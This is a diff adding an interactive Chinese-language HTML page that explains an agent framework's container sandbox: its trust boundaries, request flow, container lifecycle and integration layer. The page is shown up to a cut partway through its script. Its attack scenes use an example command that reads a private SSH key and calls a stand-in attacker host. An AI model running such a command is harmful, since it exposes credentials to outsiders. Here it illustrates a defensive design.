@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AgentEngine 沙盒架构 · 动态图解</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2330; --line:#30363d;
+    --ink:#e6edf3; --muted:#8b949e; --dim:#6e7681;
+    --trust:#58a6ff; --trust-bg:#0d2440;
+    --danger:#f85149; --danger-bg:#3d1518;
+    --safe:#3fb950; --safe-bg:#0f2417;
+    --warn:#e3b341; --warn-bg:#2b2410;
+    --purple:#bc8cff; --tool:#dc7f74;
+    --glow-blue:0 0 18px rgba(88,166,255,.55);
+    --glow-red:0 0 18px rgba(248,81,73,.6);
+    --glow-green:0 0 16px rgba(63,185,80,.5);
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    -webkit-font-smoothing:antialiased}
+  .wrap{max-width:1180px;margin:0 auto;padding:28px 22px 80px}
+  h1{font-size:25px;margin:0 0 4px;letter-spacing:.3px}
+  .sub{color:var(--muted);font-size:14px;margin-bottom:22px;line-height:1.6}
+  .sub code{background:#1f2630;padding:1px 6px;border-radius:5px;color:#cdd9e5;font-size:12.5px}
+
+  /* tabs */
+  .tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px}
+  .tab{background:var(--panel);border:1px solid var(--line);color:var(--muted);
+    padding:9px 15px;border-radius:9px;cursor:pointer;font-size:13.5px;font-weight:600;
+    transition:.18s;display:flex;align-items:center;gap:7px;user-select:none}
+  .tab:hover{border-color:#475061;color:var(--ink)}
+  .tab.active{background:var(--trust-bg);border-color:var(--trust);color:#cfe6ff;box-shadow:var(--glow-blue)}
+  .tab .n{display:inline-flex;width:19px;height:19px;border-radius:50%;background:#222b36;
+    align-items:center;justify-content:center;font-size:11px;color:var(--muted)}
+  .tab.active .n{background:var(--trust);color:#04101f}
+
+  .scene{display:none;animation:fade .4s ease}
+  .scene.show{display:block}
+  @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+  .stage{background:var(--panel);border:1px solid var(--line);border-radius:14px;
+    padding:22px;position:relative;overflow:hidden}
+  .stage-title{font-size:15px;font-weight:700;margin:0 0 3px}
+  .stage-desc{color:var(--muted);font-size:13px;margin:0 0 18px;line-height:1.6}
+
+  .controls{display:flex;gap:10px;align-items:center;margin-top:18px;flex-wrap:wrap}
+  button.act{background:var(--trust);color:#04101f;border:none;padding:10px 18px;border-radius:9px;
+    font-weight:700;font-size:13.5px;cursor:pointer;transition:.15s}
+  button.act:hover{filter:brightness(1.12);transform:translateY(-1px)}
+  button.act:active{transform:none}
+  button.act.danger{background:var(--danger);color:#fff}
+  button.act.ghost{background:transparent;border:1px solid var(--line);color:var(--muted)}
+  button.act.ghost:hover{color:var(--ink);border-color:#475061}
+  button.act:disabled{opacity:.4;cursor:not-allowed;transform:none}
+  .hint{color:var(--dim);font-size:12px}
+
+  /* generic host box */
+  .host{border:2px dashed #3a4250;border-radius:12px;padding:16px;position:relative;background:#11161e}
+  .host-label{position:absolute;top:-11px;left:14px;background:var(--panel);padding:0 9px;
+    font-size:12px;color:var(--muted);font-weight:600}
+  .row{display:flex;gap:16px;align-items:stretch;flex-wrap:wrap}
+  .col{flex:1;min-width:230px}
+
+  .node{border:1.5px solid var(--line);border-radius:10px;padding:13px 14px;background:var(--panel2);
+    position:relative;transition:.25s}
+  .node .t{font-size:13.5px;font-weight:700;margin-bottom:3px;display:flex;align-items:center;gap:7px}
+  .node .d{font-size:11.5px;color:var(--muted);line-height:1.5}
+  .node.trust{border-color:var(--trust);background:var(--trust-bg)}
+  .node.trust .t{color:#bcdcff}
+  .node.danger{border-color:var(--danger);background:var(--danger-bg)}
+  .node.danger .t{color:#ffb3ae}
+  .node.safe{border-color:var(--safe);background:var(--safe-bg)}
+  .node.safe .t{color:#9be7a8}
+  .node.tool{border-color:var(--tool)}
+  .node.tool .t{color:#f0a89f}
+  .node.pulse{box-shadow:var(--glow-blue);border-color:var(--trust)}
+  .node.pulse-red{box-shadow:var(--glow-red)}
+  .node.pulse-green{box-shadow:var(--glow-green)}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--muted);display:inline-block}
+  .dot.b{background:var(--trust)} .dot.r{background:var(--danger)} .dot.g{background:var(--safe)}
+  .tag{font-size:10px;font-weight:700;padding:2px 7px;border-radius:20px;border:1px solid;display:inline-block}
+  .tag.trust{color:var(--trust);border-color:var(--trust);background:#0d244033}
+  .tag.danger{color:var(--danger);border-color:var(--danger);background:#3d151833}
+  .tag.safe{color:var(--safe);border-color:var(--safe);background:#0f241733}
+
+  /* SVG flow canvas */
+  svg.flow{width:100%;height:auto;display:block}
+  .flowwrap{position:relative}
+
+  /* legend */
+  .legend{display:flex;gap:18px;flex-wrap:wrap;margin-top:16px;padding-top:14px;border-top:1px solid var(--line)}
+  .legend span{font-size:12px;color:var(--muted);display:flex;align-items:center;gap:7px}
+
+  /* log strip */
+  .log{margin-top:16px;background:#0a0e14;border:1px solid var(--line);border-radius:9px;
+    padding:12px 14px;font-family:"SF Mono",Consolas,monospace;font-size:12px;min-height:64px;
+    color:#9fb0c2;line-height:1.85}
+  .log .l{opacity:0;animation:logIn .35s forwards}
+  .log .l.blue{color:#7cc0ff} .log .l.red{color:#ff8a82} .log .l.green{color:#76e08a}
+  .log .l.yellow{color:#f0cd6a} .log .l.dim{color:#5f6b7a}
+  @keyframes logIn{to{opacity:1}}
+
+  /* layer map (scene 5) */
+  .layermap{display:flex;flex-direction:column;gap:10px}
+  .layer{border:1px solid var(--line);border-radius:10px;padding:12px 15px;background:var(--panel2);
+    display:flex;justify-content:space-between;align-items:center;gap:14px}
+  .layer .lt{font-weight:700;font-size:13.5px}
+  .layer .ld{font-size:11.5px;color:var(--muted);margin-top:2px}
+  .layer .badge{font-size:11px;font-weight:700;padding:4px 10px;border-radius:7px;white-space:nowrap}
+  .badge.have{background:var(--safe-bg);color:#9be7a8;border:1px solid var(--safe)}
+  .badge.soft{background:var(--warn-bg);color:#f0cd6a;border:1px solid var(--warn)}
+  .badge.add{background:var(--trust-bg);color:#bcdcff;border:1px solid var(--trust)}
+  .layer.highlight{box-shadow:var(--glow-blue);border-color:var(--trust)}
+
+  .pill{display:inline-block;font-size:11px;padding:2px 9px;border-radius:20px;background:#1f2630;color:#aab6c4;margin-right:6px}
+
+  .footer{margin-top:26px;color:var(--dim);font-size:12px;line-height:1.7;border-top:1px solid var(--line);padding-top:16px}
+  .kbd{background:#1f2630;border:1px solid #30363d;border-bottom-width:2px;border-radius:5px;padding:1px 6px;font-size:11px;color:#cdd9e5}
+
+  /* packet (moving ball) */
+  .pkt{fill:var(--trust);filter:drop-shadow(0 0 6px var(--trust))}
+  .pkt.code{fill:var(--warn);filter:drop-shadow(0 0 6px var(--warn))}
+  .pkt.evil{fill:var(--danger);filter:drop-shadow(0 0 7px var(--danger))}
+  .pkt.result{fill:var(--safe);filter:drop-shadow(0 0 6px var(--safe))}
+
+  .toggle{display:inline-flex;border:1px solid var(--line);border-radius:9px;overflow:hidden}
+  .toggle button{background:var(--panel2);border:none;color:var(--muted);padding:8px 16px;
+    font-size:13px;font-weight:600;cursor:pointer;transition:.15s}
+  .toggle button.on{background:var(--trust);color:#04101f}
+  .toggle button.on.danger{background:var(--danger);color:#fff}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <h1>AgentEngine 沙盒架构 · 动态图解</h1>
+  <p class="sub">
+    四个场景说清楚：沙盒接在 <code>Tool</code> 这一层、信任边界落在哪、不可信代码怎么被挡住、会话容器怎么生灭。
+    点上面的标签切换；每个场景有自己的 <b>▶ 播放</b> 按钮。
+  </p>
+
+  <div class="tabs" id="tabs">
+    <div class="tab active" data-s="0"><span class="n">1</span>信任边界对比</div>
+    <div class="tab" data-s="1"><span class="n">2</span>一次请求的数据流</div>
+    <div class="tab" data-s="2"><span class="n">3</span>攻击 / 逃逸演示</div>
+    <div class="tab" data-s="3"><span class="n">4</span>容器生命周期</div>
+    <div class="tab" data-s="4"><span class="n">5</span>沙盒接在哪一层</div>
+  </div>
+
+  <!-- ============ SCENE 1: TRUST BOUNDARY ============ -->
+  <div class="scene show" data-scene="0">
+    <div class="stage">
+      <p class="stage-title">场景一 · 信任边界在哪里</p>
+      <p class="stage-desc">
+        左边是你 <b>现在</b> 的形态，右边是 <b>文档</b> 主张的形态。同一段不可信代码，区别只在它跑在哪个盒子里。
+        点下面切换，看边界出现 / 消失。
+      </p>
+
+      <div class="toggle" style="margin-bottom:18px">
+        <button id="tbCur" class="on danger">现状（同进程同主机）</button>
+        <button id="tbSandbox">沙盒（容器隔离）</button>
+      </div>
+
+      <!-- CURRENT -->
+      <div id="tbViewCurrent">
+        <div class="host">
+          <span class="host-label">🖥️ 宿主机 · 同一个 OS / 同一个用户 / 同一份环境变量&密钥</span>
+          <div class="row">
+            <div class="col">
+              <div class="node trust" id="c-app">
+                <div class="t"><span class="dot b"></span>Agent App（可信）</div>
+                <div class="d">TurnRunner · ToolExecutor · ExecPolicy<br>这是你自己的代码，控制端</div>
+              </div>
+            </div>
+            <div class="col">
+              <div class="node danger" id="c-code">
+                <div class="t"><span class="dot r"></span>不可信代码（LLM 生成）</div>
+                <div class="d">bash 工具 = 直接 <code style="font-size:10px">subprocess</code><br>就在 Agent 进程的主机上跑</div>
+              </div>
+            </div>
+          </div>
+          <div style="text-align:center;margin-top:14px">
+            <span class="tag danger" id="c-verdict">⚠ 没有信任边界 —— 两者共享一切</span>
+          </div>
+        </div>
+        <div class="legend">
+          <span><span class="dot b"></span>可信（你的代码）</span>
+          <span><span class="dot r"></span>不可信（生成的代码）</span>
+          <span>🔓 边界缺失：代码能读你的密钥、写整台机器、连外网</span>
+        </div>
+      </div>
+
+      <!-- SANDBOX -->
+      <div id="tbViewSandbox" style="display:none">
+        <div class="host">
+          <span class="host-label">🖥️ 宿主机</span>
+          <div class="row" style="align-items:flex-start">
+            <div class="col" style="flex:1.1">
+              <div class="node trust" id="s-app">
+                <div class="t"><span class="dot b"></span>Agent App（可信，留在主机）</div>
+                <div class="d">TurnRunner · ToolExecutor<br>当指挥官，按需创建/销毁容器</div>
+              </div>
+              <div class="node trust" id="s-mgr" style="margin-top:12px;border-style:dashed">
+                <div class="t"><span class="dot b"></span>SandboxManager</div>
+                <div class="d">通过 Docker SDK 拉起会话容器</div>
+              </div>
+            </div>
+            <div class="col" style="flex:1.3">
+              <div class="host" id="s-wall" style="border:2.5px solid var(--safe);background:#0c1812;transition:.3s">
+                <span class="host-label" style="color:#9be7a8;background:var(--panel)">🛡️ 沙盒容器 · 隔离边界</span>
+                <div class="node danger" id="s-code">
+                  <div class="t"><span class="dot r"></span>不可信代码在这里跑</div>
+                  <div class="d">network off · cap drop ALL<br>non-root · cgroup 限额 · 只读 rootfs</div>
+                </div>
+                <div style="text-align:center;margin-top:10px">
+                  <span class="tag safe">跑不出这个盒子</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="legend">
+          <span><span class="dot b"></span>可信端（主机）</span>
+          <span><span class="dot r"></span>不可信代码（容器内）</span>
+          <span><span class="dot g"></span>🛡️ 内核/系统调用层隔离：逃逸≈攻破容器 runtime</span>
+        </div>
+      </div>
+
+      <div class="controls">
+        <button class="act" id="tbPlay">▶ 对比：往两边各丢一段恶意代码</button>
+        <span class="hint">观察同一动作在两种结构下的不同结局</span>
+      </div>
+      <div class="log" id="tbLog"></div>
+    </div>
+  </div>
+
+  <!-- ============ SCENE 2: DATA FLOW ============ -->
+  <div class="scene" data-scene="1">
+    <div class="stage">
+      <p class="stage-title">场景二 · 一次请求的完整数据流</p>
+      <p class="stage-desc">
+        文档第二节那条链路，跑成动画。小球沿路走：<span style="color:var(--trust)">蓝=请求</span> →
+        <span style="color:var(--warn)">黄=生成的代码</span> → <span style="color:var(--safe)">绿=结果</span>。
+        关键：代码那一棒进的是会话容器，<b>对 ToolExecutor 以上完全透明</b>。
+      </p>
+
+      <div class="flowwrap">
+        <svg class="flow" viewBox="0 0 1100 420" id="flowSvg">
+          <!-- boundary box around sandbox -->
+          <rect x="690" y="250" width="370" height="150" rx="14" fill="#0c1812" stroke="#3fb950" stroke-width="2.5" stroke-dasharray="7 5"/>
+          <text x="705" y="272" fill="#9be7a8" font-size="13" font-weight="700">🛡️ 沙盒容器（隔离边界）</text>
+
+          <!-- nodes -->
+          <g id="n-user">
+            <rect x="40" y="40" width="170" height="64" rx="11" fill="#0d2440" stroke="#58a6ff" stroke-width="1.6"/>
+            <text x="125" y="68" fill="#bcdcff" font-size="14" font-weight="700" text-anchor="middle">① 用户请求</text>
+            <text x="125" y="88" fill="#8b949e" font-size="11" text-anchor="middle">Web / CLI / Host</text>
+          </g>
+          <g id="n-engine">
+            <rect x="300" y="40" width="170" height="64" rx="11" fill="#1c2330" stroke="#bc8cff" stroke-width="1.6"/>
+            <text x="385" y="68" fill="#d8c4ff" font-size="14" font-weight="700" text-anchor="middle">② AgentEngine</text>
+            <text x="385" y="88" fill="#8b949e" font-size="11" text-anchor="middle">TurnRunner · run_turn</text>
+          </g>
+          <g id="n-llm">
+            <rect x="560" y="40" width="170" height="64" rx="11" fill="#1c2330" stroke="#e8a94f" stroke-width="1.6"/>
+            <text x="645" y="68" fill="#f0cd8a" font-size="14" font-weight="700" text-anchor="middle">③ LLM</text>
+            <text x="645" y="88" fill="#8b949e" font-size="11" text-anchor="middle">生成 tool_calls（代码）</text>
+          </g>
+          <g id="n-exec">
+            <rect x="430" y="180" width="200" height="64" rx="11" fill="#1c2330" stroke="#dc7f74" stroke-width="1.6"/>
+            <text x="530" y="206" fill="#f0a89f" font-size="14" font-weight="700" text-anchor="middle">④ ToolExecutor</text>
+            <text x="530" y="226" fill="#8b949e" font-size="11" text-anchor="middle">ExecPolicy 准入 · 超时 · 事件</text>
+          </g>
+          <g id="n-tool">
+            <rect x="720" y="290" width="200" height="64" rx="11" fill="#3d1518" stroke="#f85149" stroke-width="1.6"/>
+            <text x="820" y="316" fill="#ffb3ae" font-size="14" font-weight="700" text-anchor="middle">⑤ SandboxedBashTool</text>
+            <text x="820" y="336" fill="#c98" font-size="11" text-anchor="middle">exec 进容器执行代码</text>
+          </g>
+
+          <!-- edges -->
+          <path id="e1" d="M210,72 L300,72" stroke="#475061" stroke-width="2" fill="none" marker-end="url(#arr)"/>
+          <path id="e2" d="M470,72 L560,72" stroke="#475061" stroke-width="2" fill="none" marker-end="url(#arr)"/>
+          <path id="e3" d="M645,104 L645,150 L530,150 L530,180" stroke="#475061" stroke-width="2" fill="none" marker-end="url(#arr)"/>
+          <path id="e4" d="M630,212 L720,300" stroke="#475061" stroke-width="2" fill="none" marker-end="url(#arr)"/>
+          <path id="e5" d="M720,330 L430,330 L430,244" stroke="#475061" stroke-width="2" fill="none" marker-end="url(#arr)" stroke-dasharray="0"/>
+          <path id="e6" d="M430,212 L210,212 L210,104" stroke="#475061" stroke-width="2" fill="none" marker-end="url(#arr)"/>
+
+          <defs>
+            <marker id="arr" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto">
+              <path d="M0,0 L8,3 L0,6 Z" fill="#6e7681"/>
+            </marker>
+          </defs>
+
+          <!-- moving packet -->
+          <circle id="packet" class="pkt" r="8" cx="125" cy="72" opacity="0"/>
+        </svg>
+      </div>
+
+      <div class="controls">
+        <button class="act" id="flowPlay">▶ 播放数据流</button>
+        <button class="act ghost" id="flowReset">重置</button>
+        <span class="hint">①→②→③ 生成代码，④ 过策略闸门，⑤ 进容器跑，结果原路返回</span>
+      </div>
+      <div class="log" id="flowLog"></div>
+    </div>
+  </div>
+
+  <!-- ============ SCENE 3: ATTACK / ESCAPE ============ -->
+  <div class="scene" data-scene="2">
+    <div class="stage">
+      <p class="stage-title">场景三 · 恶意代码：现状被穿透 vs 沙盒被挡住</p>
+      <p class="stage-desc">
+        同一段恶意代码 <code>cat ~/.ssh/id_rsa &amp;&amp; curl evil.com</code>。
+        切换两种结构，点 <b>▶ 注入</b>，看红色尝试是穿透到主机、还是撞墙。
+      </p>
+
+      <div class="toggle" style="margin-bottom:16px">
+        <button id="atkCur" class="on danger">现状（无隔离）</button>
+        <button id="atkSbx">沙盒（容器隔离）</button>
+      </div>
+
+      <div class="flowwrap">
+        <svg class="flow" viewBox="0 0 1100 360" id="atkSvg">
+          <!-- host -->
+          <rect x="30" y="30" width="1040" height="300" rx="14" fill="#11161e" stroke="#3a4250" stroke-width="2" stroke-dasharray="6 5"/>
+          <text x="48" y="55" fill="#8b949e" font-size="13" font-weight="700">🖥️ 宿主机</text>
+
+          <!-- secrets / network targets on host -->
+          <g id="a-secret">
+            <rect x="70" y="210" width="150" height="58" rx="10" fill="#2b2410" stroke="#e3b341" stroke-width="1.5"/>
+            <text x="145" y="234" fill="#f0cd6a" font-size="12.5" font-weight="700" text-anchor="middle">🔑 ~/.ssh 密钥</text>
+            <text x="145" y="252" fill="#8b949e" font-size="10.5" text-anchor="middle">环境变量 / 凭证</text>
+          </g>
+          <g id="a-net">
+            <rect x="880" y="210" width="150" height="58" rx="10" fill="#2b2410" stroke="#e3b341" stroke-width="1.5"/>
+            <text x="955" y="234" fill="#f0cd6a" font-size="12.5" font-weight="700" text-anchor="middle">🌐 外网</text>
+            <text x="955" y="252" fill="#8b949e" font-size="10.5" text-anchor="middle">curl evil.com</text>
+          </g>
+
+          <!-- the executing code box (position differs by mode) -->
+          <g id="a-codebox">
+            <rect id="a-cbrect" x="455" y="120" width="190" height="70" rx="11" fill="#3d1518" stroke="#f85149" stroke-width="1.8"/>
+            <text x="550" y="148" fill="#ffb3ae" font-size="13" font-weight="700" text-anchor="middle">恶意代码执行中</text>
+            <text x="550" y="168" fill="#c98" font-size="10.5" text-anchor="middle">cat id_rsa &amp;&amp; curl…</text>
+          </g>
+
+          <!-- sandbox wall (hidden in current mode) -->
+          <rect id="a-wall" x="430" y="95" width="240" height="125" rx="14" fill="none" stroke="#3fb950" stroke-width="2.6" stroke-dasharray="7 5" opacity="0"/>
+          <text id="a-walltxt" x="450" y="115" fill="#9be7a8" font-size="12" font-weight="700" opacity="0">🛡️ 沙盒边界</text>
+
+          <!-- attack rays (drawn dynamically) -->
+          <path id="ray-left"  d="" stroke="#f85149" stroke-width="3" fill="none" opacity="0"/>
+          <path id="ray-right" d="" stroke="#f85149" stroke-width="3" fill="none" opacity="0"/>
+          <!-- block marks -->
+          <text id="blk-left"  x="0" y="0" fill="#3fb950" font-size="26" font-weight="900" opacity="0">✕</text>
+          <text id="blk-right" x="0" y="0" fill="#3fb950" font-size="26" font-weight="900" opacity="0">✕</text>
+        </svg>
+      </div>
+
+      <div class="controls">
+        <button class="act danger" id="atkPlay">▶ 注入恶意代码</button>
+        <span class="hint" id="atkHint">现状：射线会穿透到密钥和外网</span>
+      </div>
+      <div class="log" id="atkLog"></div>
+    </div>
+  </div>
+
+  <!-- ============ SCENE 4: CONTAINER LIFECYCLE ============ -->
+  <div class="scene" data-scene="3">
+    <div class="stage">
+      <p class="stage-title">场景四 · 会话容器的生命周期</p>
+      <p class="stage-desc">
+        文档的"会话容器"模型：一个 conversation 一个容器，建一次、反复 exec、状态驻留、结束销毁。
+        点 <b>▶ 走一遍会话</b>。
+      </p>
+
+      <div class="flowwrap">
+        <svg class="flow" viewBox="0 0 1100 300" id="lifeSvg">
+          <!-- manager -->
+          <rect x="40" y="110" width="170" height="80" rx="11" fill="#0d2440" stroke="#58a6ff" stroke-width="1.6"/>
+          <text x="125" y="142" fill="#bcdcff" font-size="13.5" font-weight="700" text-anchor="middle">SandboxManager</text>
+          <text x="125" y="162" fill="#8b949e" font-size="11" text-anchor="middle">主机 · 可信</text>
+          <text x="125" y="178" fill="#8b949e" font-size="11" text-anchor="middle">acquire / release</text>
+
+          <!-- container shell -->
+          <rect id="life-shell" x="330" y="50" width="430" height="200" rx="16" fill="#0c1812" stroke="#30363d" stroke-width="2.4" opacity="0.25"/>
+          <text id="life-shelltxt" x="350" y="76" fill="#6e7681" font-size="12.5" font-weight="700" opacity="0.4">🛡️ 会话容器（未创建）</text>
+
+          <!-- kernel/daemon inside -->
+          <rect id="life-kernel" x="370" y="120" width="160" height="100" rx="11" fill="#1c2330" stroke="#30363d" stroke-width="1.5" opacity="0.2"/>
+          <text id="life-kerneltxt" x="450" y="155" fill="#8b949e" font-size="12.5" font-weight="700" text-anchor="middle" opacity="0.2">常驻进程</text>
+          <text id="life-state" x="450" y="180" fill="#8b949e" font-size="11" text-anchor="middle" opacity="0.2">state: —</text>
+          <text id="life-state2" x="450" y="198" fill="#8b949e" font-size="11" text-anchor="middle" opacity="0.2"> </text>
+
+          <!-- exec slots -->
+          <rect id="life-exec" x="560" y="120" width="170" height="100" rx="11" fill="#2b2410" stroke="#30363d" stroke-width="1.5" opacity="0.2"/>
+          <text id="life-exectxt" x="645" y="150" fill="#8b949e" font-size="12.5" font-weight="700" text-anchor="middle" opacity="0.2">exec 区</text>
+          <text id="life-execcmd" x="645" y="175" fill="#8b949e" font-size="10.5" text-anchor="middle" opacity="0.2"> </text>
+          <text id="life-execout" x="645" y="195" fill="#8b949e" font-size="10.5" text-anchor="middle" opacity="0.2"> </text>
+
+          <!-- arrows -->
+          <path id="life-arrow" d="M210,150 L330,150" stroke="#475061" stroke-width="2.2" fill="none" marker-end="url(#arr2)" opacity="0.3"/>
+          <defs>
+            <marker id="arr2" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto">
+              <path d="M0,0 L8,3 L0,6 Z" fill="#6e7681"/>
+            </marker>
+          </defs>
+
+          <!-- timeline ticks -->
+          <text id="life-phase" x="550" y="285" fill="#8b949e" font-size="12.5" font-weight="700" text-anchor="middle">阶段：待机</text>
+        </svg>
+      </div>
+
+      <div class="controls">
+        <button class="act" id="lifePlay">▶ 走一遍会话</button>
+        <button class="act ghost" id="lifeReset">重置</button>
+        <span class="hint">建容器那笔贵开销，一个会话只付一次；变量在 exec 之间保留</span>
+      </div>
+      <div class="log" id="lifeLog"></div>
+    </div>
+  </div>
+
+  <!-- ============ SCENE 5: WHICH LAYER ============ -->
+  <div class="scene" data-scene="4">
+    <div class="stage">
+      <p class="stage-title">场景五 · 沙盒到底接在哪一层</p>
+      <p class="stage-desc">
+        一句话：<b>接在 <code>Tool</code> 抽象这一层</b>。下面是你的实际分层，
+        <span style="color:var(--safe)">绿=已有</span>、<span style="color:var(--warn)">黄=软约束</span>、<span style="color:var(--trust)">蓝=要新增</span>。
+        点 <b>▶ 高亮改动点</b> 看哪些动、哪些不动。
+      </p>
+
+      <div class="layermap" id="layermap">
+        <div class="layer" data-k="runner">
+          <div><div class="lt">TurnRunner · run_turn（运行编排）</div>
+            <div class="ld">只跟 <code>Tool.run()</code> 抽象打交道 → 换不换容器它无感</div></div>
+          <span class="badge have">✓ 已有 · 不动</span>
+        </div>
+        <div class="layer" data-k="exec">
+          <div><div class="lt">ToolExecutor（超时 / 事件 / 准入）</div>
+            <div class="ld">在工具运行前调 ExecPolicy；包 asyncio 超时</div></div>
+          <span class="badge have">✓ 已有 · 不动</span>
+        </div>
+        <div class="layer" data-k="policy">
+          <div><div class="lt">ExecPolicy（Allow / Deny / Ask）</div>
+            <div class="ld">字符串前缀匹配 —— 是真实分层，但<b>不能当安全边界</b></div></div>
+          <span class="badge soft">~ 软约束 · 建议收紧</span>
+        </div>
+        <div class="layer highlight" data-k="tool" style="border-color:var(--trust)">
+          <div><div class="lt">⭐ Tool 抽象 ← 沙盒的落点</div>
+            <div class="ld">新增 <code>SandboxedBashTool</code>：同名 <code>"bash"</code>，把执行下沉到容器</div></div>
+          <span class="badge add">＋ 新增实现</span>
+        </div>
+        <div class="layer" data-k="mgr">
+          <div><div class="lt">SandboxManager（容器生命周期）</div>
+            <div class="ld">与 ConversationLockManager 同级；带安全清单参数</div></div>
+          <span class="badge add">＋ 新增（运行编排层）</span>
+        </div>
+        <div class="layer" data-k="cur">
+          <div><div class="lt">BashTool（现状：直接 subprocess）</div>
+            <div class="ld">保留，本地/信任场景用；生产换成 SandboxedBashTool</div></div>
+          <span class="badge soft">~ 保留 · 部署期二选一</span>
+        </div>
+      </div>
+
+      <div class="controls">
+        <button class="act" id="layerPlay">▶ 高亮改动点</button>
+        <span class="hint">核心不动、不依赖 Docker；隔离作为部署期可插拔实现接入</span>
+      </div>
+      <div class="log" id="layerLog"></div>
+    </div>
+  </div>
+
+  <div class="footer">
+    切换场景：点顶部标签，或按 <span class="kbd">←</span> <span class="kbd">→</span>。
+    本页纯静态、零依赖，可直接在浏览器打开，也能嵌进 Obsidian。<br>
+    对应源码：<span class="pill">tools/builtin/bash_tool.py</span><span class="pill">tools/executor.py</span><span class="pill">tools/policy.py</span><span class="pill">tools/base.py</span>
+  </div>
+</div>
+
+<script>
+/* ---------- helpers ---------- */
+const $ = s => document.querySelector(s);
+const $$ = s => Array.from(document.querySelectorAll(s));
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
+function logTo(el, lines){ // lines: [{t,cls,delay}]
+  el.innerHTML='';
+  let acc=0;
+  lines.forEach(L=>{
+    const d=document.createElement('div');
+    d.className='l '+(L.cls||'');
+    d.textContent=L.t;
+    d.style.animationDelay=(acc)+'ms';
+    el.appendChild(d);
+    acc += (L.delay!=null?L.delay:380);
+  });
+}
+
+/* ---------- tab switching ---------- */
+let cur=0;
+function show(i){
+  cur=i;
+  $$('.tab').forEach(t=>t.classList.toggle('active', +t.dataset.s===i));
+  $$('.scene').forEach(s=>s.classList.toggle('show', +s.dataset.scene===i));
+}
+$$('.tab').forEach(t=>t.addEventListener('click',()=>show(+t.dataset.s)));
+window.addEventListener('keydown',e=>{
+  if(e.key==='ArrowRight') show(Math.min(4,cur+1));
+  if(e.key==='ArrowLeft')  show(Math.max(0,cur-1));
+});
+
+/* ============ SCENE 1 ============ */
+const tbCur=$('#tbCur'), tbSbx=$('#tbSandbox');
+const tbVC=$('#tbViewCurrent'), tbVS=$('#tbViewSandbox');
+let tbMode='current';
+function tbSet(m){
+  tbMode=m;
+  tbCur.classList.toggle('on', m==='current');
+  tbCur.classList.toggle('danger', m==='current');
+  tbSbx.classList.toggle('on', m==='sandbox');
+  tbVC.style.display = m==='current'?'block':'none';
+  tbVS.style.display = m==='sandbox'?'block':'none';
+  $('#tbLog').innerHTML='';
+}
+tbCur.onclick=()=>tbSet('current');
+tbSbx.onclick=()=>tbSet('sandbox');
+
+$('#tbPlay').onclick=async()=>{
+  if(tbMode==='current'){
+    const code=$('#c-code'), app=$('#c-app');
+    code.classList.add('pulse-red'); await sleep(500);
+    app.classList.add('pulse-red');  // attack reaches app/host
+    $('#c-verdict').textContent='💥 代码读到了密钥、写了主机、连了外网';
+    logTo($('#tbLog'),[
+      {t:'$ 不可信代码开始执行…',cls:'dim'},
+      {t:'→ 共享同一个进程 / 用户 / 环境变量',cls:'red'},
+      {t:'✗ cat ~/.ssh/id_rsa   读到主机密钥',cls:'red'},
+      {t:'✗ curl evil.com       外网可达',cls:'red'},
+      {t:'结论：没有边界，失手=主机沦陷',cls:'red'},
+    ]);
+    await sleep(2600);
+    code.classList.remove('pulse-red'); app.classList.remove('pulse-red');
+    $('#c-verdict').textContent='⚠ 没有信任边界 —— 两者共享一切';
+  } else {
+    const code=$('#s-code'), wall=$('#s-wall');
+    code.classList.add('pulse-red'); await sleep(500);
+    wall.style.boxShadow='var(--glow-green)';
+    logTo($('#tbLog'),[
+      {t:'$ 不可信代码开始执行…',cls:'dim'},
+      {t:'→ 被关在沙盒容器内',cls:'green'},
+      {t:'✗ cat ~/.ssh/id_rsa   容器内没有主机密钥',cls:'green'},
+      {t:'✗ curl evil.com       network_disabled，连不出去',cls:'green'},
+      {t:'结论：跑飞也只是这个会话挂掉，碰不到主机',cls:'green'},
+    ]);
+    await sleep(2600);
+    code.classList.remove('pulse-red'); wall.style.boxShadow='';
+  }
+};
+
+/* ============ SCENE 2 ============ */
+const packet=$('#packet');
+const P={
+  user:[125,72], engine:[385,72], llm:[645,72], exec:[530,212], tool:[820,322]
+};
+function setPkt(x,y){ packet.setAttribute('cx',x); packet.setAttribute('cy',y); }
+async function movePkt(from,to,ms){
+  const [x0,y0]=from,[x1,y1]=to;
+  const steps=Math.max(12,Math.round(ms/16));
+  for(let i=0;i<=steps;i++){
+    const t=i/steps, e=t<.5?2*t*t:1-Math.pow(-2*t+2,2)/2;
+    setPkt(x0+(x1-x0)*e, y0+(y1-y0)*e);
+    await sleep(ms/steps);
+  }
+}
+function pktClass(c){ packet.setAttribute('class','pkt'+(c?' '+c:'')); }
+function flash(id){ const n=$(id); n.style.filter='brightness(1.5)'; setTimeout(()=>n.style.filter='',420); }
+
+$('#flowReset').onclick=()=>{ packet.setAttribute('opacity','0'); $('#flowLog').innerHTML=''; };
+$('#flowPlay').onclick=async()=>{
+  const btn=$('#flowPlay'); btn.disabled=true;
+  $('#flowLog').innerHTML='';
+  packet.setAttribute('opacity','1'); pktClass(''); setPkt(...P.user);
+  const log=$('#flowLog');
+  const add=(t,cls)=>{const d=document.createElement('div');d.className='l '+(cls||'');d.style.animationDelay='0ms';d.textContent=t;log.appendChild(d);};
+
+  add('① 用户请求进入 →','blue'); flash('#n-user');
+  await movePkt(P.user,P.engine,650); flash('#n-engine');
+  add('② AgentEngine / TurnRunner 接管','blue');
+  await movePkt(P.engine,P.llm,650); flash('#n-llm');
+  add('③ LLM 生成 tool_calls（代码）','yellow');
+  pktClass('code');
+  await movePkt(P.llm,P.exec,750); flash('#n-exec');
